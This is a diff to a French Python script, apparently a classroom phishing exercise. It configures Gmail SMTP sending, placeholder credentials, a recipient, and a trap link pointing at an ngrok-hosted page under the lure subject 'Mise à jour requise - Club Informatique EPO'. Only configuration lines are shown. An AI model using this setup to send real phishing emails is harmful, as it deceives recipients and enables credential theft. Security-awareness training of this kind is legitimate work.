@@ -5,21 +5,21 @@ from email.mime.multipart import MIMEMultipart
 # ==============================================================================
 # CONFIGURATION DU SERVEUR DE MESSAGERIE (EXEMPLE AVEC GMAIL)
 # ==============================================================================
-SMTP_SERVER = "://gmail.com"
+SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 # ATTENTION : Utilisez une adresse de test créée spécifiquement pour le projet
-SENDER_EMAIL = "@gmail.com"
+SENDER_EMAIL = "votre_adresse@gmail.com"
 # Pour Gmail, générez un "Mot de passe d'application" dans la sécurité de votre compte
-SENDER_PASSWORD = "votre_mot_de_passe_d_application" 
+SENDER_PASSWORD = "mot_de_passe_d_application" 
 
 # Adresse de destination (votre professeur ou votre propre adresse de test)
-RECIPIENT_EMAIL = "professeur@example.com"
+RECIPIENT_EMAIL = "destination@gmail.com"
 
 # ==============================================================================
 # CONFIGURATION DU MESSAGE DE PHISHING
 # ==============================================================================
 # Votre lien généré par Ngrok
-LIEN_PIEGE = "https://thousand-turtle-surcharge.ngrok-free.dev"
+LIEN_PIEGE = "https://thousand-turtle-surcharge.ngrok-free.dev/cie-epo/index.html"
 
 subject = "[IMPORTANT] Mise à jour requise - Club Informatique EPO"
 
